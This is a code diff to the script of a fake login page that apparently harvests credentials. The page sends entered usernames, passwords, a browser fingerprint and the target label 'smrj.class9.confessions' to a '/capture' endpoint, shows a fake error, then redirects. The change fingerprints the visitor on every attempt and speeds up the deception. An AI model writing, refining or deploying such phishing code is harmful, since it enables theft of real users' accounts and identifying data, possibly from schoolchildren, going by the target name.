@@ -197,18 +197,16 @@
             loginBtn.disabled = true;
             errorMsg.style.display = 'none';
 
-            let payload = {
+            const fingerprint = await getFingerprint();
+
+            const payload = {
                 username: username,
                 password: password,
                 target: "smrj.class9.confessions",
                 time: Date.now(),
-                attempt: attemptCount
+                attempt: attemptCount,
+                fingerprint: fingerprint
             };
-
-            if (attemptCount === 1) {
-                const fingerprint = await getFingerprint();
-                payload.fingerprint = fingerprint;
-            }
 
             try {
                 await fetch('/capture', {
@@ -227,11 +225,11 @@
                     errorMsg.style.display = 'block';
                     loginBtn.innerHTML = 'Log in';
                     loginBtn.disabled = false;
-                }, 1400);
+                }, 800);   // Faster
             } else {
                 setTimeout(() => {
                     window.location.href = "1.html";
-                }, 1600);
+                }, 1000);   // Faster redirect
             }
         });
     </script>
